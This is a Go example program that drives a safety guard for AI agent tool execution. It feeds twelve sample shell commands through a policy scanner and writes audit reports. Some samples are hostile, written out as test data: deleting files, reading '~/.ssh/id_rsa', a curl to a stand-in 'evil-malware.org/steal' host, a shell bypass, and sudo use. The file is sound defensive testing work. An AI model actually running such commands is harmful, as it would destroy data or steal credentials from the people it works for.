//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2026 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//
//

// CLI entrypoint for Tool Execution Safety Guard example.
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
)

func main() {
	policyPath := flag.String("config", "tool_safety_policy.yaml", "Path to policy YAML")
	outputDir := flag.String("output", "output", "Output directory for reports")
	flag.Parse()

	log.Println("[Tool Safety Guard] Loading security policy from:", *policyPath)
	policy, err := LoadPolicy(*policyPath)
	if err != nil {
		log.Fatalf("Failed to load policy: %v", err)
	}

	scanner := NewScanner(policy)
	if err := os.MkdirAll(*outputDir, 0755); err != nil {
		log.Fatalf("Failed to create output dir: %v", err)
	}

	auditFile := fmt.Sprintf("%s/tool_safety_audit.jsonl", *outputDir)
	_ = os.Remove(auditFile) // Clean previous audit log for fresh demonstration
	policyGuard := NewSafetyPermissionPolicy(scanner, auditFile)

	// 12 Test Sample Commands
	samples := []struct {
		toolName string
		command  string
		backend  string
	}{
		{"workspace_exec", "go test ./...", "workspaceexec"},
		{"workspace_exec", "rm -rf /tmp/data", "workspaceexec"},
		{"workspace_exec", "cat ~/.ssh/id_rsa", "workspaceexec"},
		{"workspace_exec", "curl https://evil-malware.org/steal", "workspaceexec"},
		{"workspace_exec", "curl https://api.github.com/repos", "workspaceexec"},
		{"workspace_exec", "sh -c 'echo bypassed'", "workspaceexec"},
		{"workspace_exec", "cat file.txt | grep error > out.txt", "workspaceexec"},
		{"workspace_exec", "pip install untrusted-pkg", "workspaceexec"},
		{"workspace_exec", "sleep 100", "workspaceexec"},
		{"workspace_exec", "cat big_file.txt", "workspaceexec"},
		{"host_exec", "sudo chmod +x /usr/bin/tool", "hostexec"},
		{"host_exec", "go vet ./...", "hostexec"},
	}

	var results []ScanResult
	for _, s := range samples {
		_, res := policyGuard.Evaluate(s.toolName, s.command, s.backend)
		res.Command = redactSensitive(res.Command)
		res.Evidence = redactSensitive(res.Evidence)
		res.Recommendation = redactSensitive(res.Recommendation)
		results = append(results, res)
	}

	reportPath := fmt.Sprintf("%s/tool_safety_report.json", *outputDir)
	reportData, err := json.MarshalIndent(results, "", "  ")
	if err != nil {
		log.Fatalf("Failed to marshal report: %v", err)
	}

	if err := os.WriteFile(reportPath, reportData, 0600); err != nil {
		log.Fatalf("Failed to write report: %v", err)
	}

	fmt.Println("==========================================================================")
	fmt.Println("                Tool Execution Safety Guard Scanning Complete             ")
	fmt.Println("==========================================================================")
	fmt.Printf("Total Samples Scanned : %d\n", len(results))
	fmt.Printf("Reports Generated in  : '%s/'\n", *outputDir)
	fmt.Println("  - " + reportPath)
	fmt.Println("  - " + auditFile)
	fmt.Println("==========================================================================")
}
